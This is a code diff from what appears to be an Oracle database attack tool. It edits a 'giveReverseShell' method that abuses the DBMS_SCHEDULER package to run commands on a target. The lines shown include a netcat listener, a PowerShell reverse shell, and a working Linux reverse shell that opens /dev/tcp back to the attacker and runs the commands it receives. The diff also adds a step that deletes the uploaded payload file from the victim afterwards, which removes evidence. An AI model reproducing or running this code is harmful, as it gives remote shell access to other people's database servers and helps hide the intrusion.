@@ -160,7 +160,7 @@ class DbmsScheduler (OracleDatabase):
 			subprocess.call("nc -l -4 -n -v -p {0}".format(port), shell=True)
 		except KeyboardInterrupt: pass
 
-	def giveReverseShell(self, localip, localport, httpServerTimeout=15, targetFilename="t.cmd"):
+	def giveReverseShell(self, localip, localport, httpServerTimeout=15, targetFilename="tfod.cmd"):
 		'''
 		Give a reverse tcp shell via nc
 		Need upload nc.exe if the remote system is windows
@@ -169,6 +169,7 @@ class DbmsScheduler (OracleDatabase):
 		'''
 		if self.remoteSystemIsWindows() == True :
 			CMD_EXEC_FILE = ".\{0}"
+			CMD_DEL_FILE = "del {0}"
 			httpPort = None
 			CMD = self.getReverseShellPowershellCommand(localip, localport)
 			logging.debug('The following command will be executed on the target: {0}'.format(CMD))
@@ -189,19 +190,12 @@ class DbmsScheduler (OracleDatabase):
 				self.args['print'].goodNews("Connection closed")
 			status = self.__getJobStatus__()
 			self.__removeJob__(self.jobName, force=False, defer=True)
-			
-
-			"""
-			self.args['print'].goodNews("The powershell reverse shell tries to connect to {0}:{1}".format(localip, localport))
-			a = Thread(None, self.__runListenNC__, None, (), {'port': localport})
-			a.start()
-			try:
-				self.execOSCommand(cmd=CMD)
-			except KeyboardInterrupt:
-				self.args['print'].goodNews("Connection closed")
-			self.__getJobStatus__()
+			logging.debug("Removing file {0} remotely".format(targetFilename))
+			self.execOSCommand(cmd=CMD_DEL_FILE.format(targetFilename), prepandWindCmdPath=True)
+			status = self.__getJobStatus__()
 			self.__removeJob__(self.jobName, force=False, defer=True)
-			"""
+
+
 		elif self.remoteSystemIsLinux() == True :
 			#PYTHON_CODE = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);""".format(localip, localport)
 			PYTHON_CODE = """import os; os.system('exec 5<>/dev/tcp/{0}/{1}; /bin/cat <&5 | while read line; do $line 2>&5 >&5; done');""".format(localip, localport)
